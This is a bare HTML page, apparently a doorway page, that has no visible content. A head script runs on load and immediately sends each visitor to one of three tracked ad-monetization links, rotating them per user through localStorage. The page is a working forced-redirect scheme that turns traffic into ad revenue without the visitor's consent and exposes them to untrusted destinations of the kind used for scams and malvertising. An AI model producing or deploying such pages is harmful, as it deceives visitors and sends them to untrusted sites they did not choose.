<!DOCTYPE html>
<html lang="bn">
<head>
<script type='text/javascript'>
  // Serial redirect system (per-user rotation)
  var links = [
    'https://www.effectivegatecpm.com/zcvm0rch?key=93b158ea491b4f11e0adbacd15934c67',
    'https://bedsidemeasuring.com/rze4wd8aa?key=74d74ecf1cacbe96436ceb718716741c',
    'https://valianttossczar.com/fz3ifw9n?key=255cb9b54aebe1dca0f89408b47e3fcf'
  ];

  // Get last visited index for this user
  var index = localStorage.getItem("user_redirect_index");

  // If first time visitor → start from link1
  if (index === null) {
    index = 0;
  } else {
    index = parseInt(index) + 1;
  }

  // Reset index after last link
  if (index >= links.length) {
    index = 0;
  }

  // Save updated index for this user only
  localStorage.setItem("user_redirect_index", index);

  // Redirect user
  window.location.href = links[index];
</script>
</head>
<body>
</body>
</html>
